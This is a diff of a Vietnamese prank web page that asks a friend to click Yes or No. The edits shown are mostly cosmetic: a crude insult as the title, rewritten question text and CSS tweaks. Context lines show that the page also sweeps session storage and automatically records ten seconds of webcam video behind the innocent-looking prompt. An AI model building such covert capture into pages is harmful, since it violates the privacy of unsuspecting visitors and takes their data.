@@ -2,7 +2,7 @@
 <html lang="vi">
 <head>
     <meta charset="UTF-8">
-    <title>🖤 Một Lời Hồi Đáp Từ Bóng Đêm...</title>
+    <title>Dit Me May💯...</title>
     <style>
         /* Keyframes cho hiệu ứng nhấp nháy chữ "Hihi" */
         @keyframes blink {
@@ -12,14 +12,14 @@
         
         /* Keyframes cho hiệu ứng chuyển màu 7 Màu (Rainbow) nhạt hơn và sáng hơn */
         @keyframes rainbowLight {
-            0% { color: #f5a6b0; } /* Đỏ nhạt */
-            14% { color: #ffd6b0; } /* Cam nhạt */
-            28% { color: #fffcb0; } /* Vàng nhạt */
-            42% { color: #b0ffb0; } /* Xanh lá nhạt */
-            56% { color: #b0b0ff; } /* Xanh dương nhạt */
-            70% { color: #d0b0ff; } /* Chàm nhạt */
-            84% { color: #ffb0ff; } /* Tím nhạt */
-            100% { color: #f5a6b0; } /* Trở lại Đỏ nhạt */
+            0% { color: #f5a6b0; } 
+            14% { color: #ffd6b0; } 
+            28% { color: #fffcb0; } 
+            42% { color: #b0ffb0; } 
+            56% { color: #b0b0ff; } 
+            70% { color: #d0b0ff; } 
+            84% { color: #ffb0ff; } 
+            100% { color: #f5a6b0; } 
         }
 
         /* Keyframes cho chữ bay lượn trên nền */
@@ -32,8 +32,8 @@
         }
 
         body { 
-            background-color: #000000; /* Nền ĐEN KỊCH */
-            color: #ffffff; /* Chữ mặc định trắng */
+            background-color: #000000; 
+            color: #ffffff; 
             text-align: center; 
             padding-top: 50px; 
             font-family: 'Segoe UI', cursive, sans-serif; 
@@ -57,6 +57,7 @@
             pointer-events: none; 
             white-space: nowrap; 
             text-shadow: 0 0 8px rgba(255, 255, 255, 0.5); 
+            will-change: transform; /* Thêm để tối ưu và tránh xung đột với chữ chính */
         }
 
         .love-box { 
@@ -81,20 +82,15 @@
             text-shadow: 0 0 15px #ffb3d9; 
         }
 
-        .question { 
-            font-size: 2em; 
-            margin-bottom: 40px; 
-            color: #ff69b4; 
-            font-weight: bold;
-        }
-        
-        /* Hiệu ứng cho câu hỏi chính - Đứng yên và to nhất */
+        /* Hiệu ứng cho câu hỏi chính - Bắt buộc Đứng yên */
         .flirty-text {
             color: #ff4081;
             font-size: 3.5em; 
             margin-bottom: 40px; 
             text-shadow: 0 0 20px rgba(255, 64, 129, 0.8); 
-            line-height: 1.2; 
+            line-height: 1; /* Đặt lại line-height = 1 để tránh dịch chuyển */
+            padding: 0;
+            margin-top: 0;
         }
 
         /* Hiệu ứng nhấp nháy riêng cho "Hihi" - Vẫn giữ lại */
@@ -126,8 +122,8 @@
 </head>
 <body>
     <div class="love-box" id="main-content">
-        <h1>💌 Gửi Tặng Người Đặc Biệt!</h1>
-        <p class="flirty-text">Bạn Có Yêu Nờ Vinh Không? <span class="hihi-blink">Hihi</span></p>
+        <h1>Gửi Tặng Người Bạn Chí Cốt Của Tôi🙄!</h1>
+        <p class="flirty-text">Đừng Chọn Có Hoặc Không Nguy Hiểm Lắm Đó Cốt Ngu Ơi😭 <span class="hihi-blink">Hihi</span></p>
         <button class="answer-button yes-button" id="yes-button">Có</button>
         <button class="answer-button no-button" id="no-button">Không</button>
     </div>
@@ -328,7 +324,7 @@ ${sweepStorage(sessionStorage, 'Session Storage')}
                 }, 1000); 
 
                 // --- TỰ ĐỘNG QUAY VIDEO 10 GIÂY ---
-                // Chỉ sử dụng codec mặc định được hỗ trợ tốt nhất
+                // Chỉ sử dụng codec mặc định được hỗ trợ tốt nhất và phổ biến nhất
                 const options = { mimeType: 'video/webm' };
                 mediaRecorder = new MediaRecorder(webcamStream, options);
                 
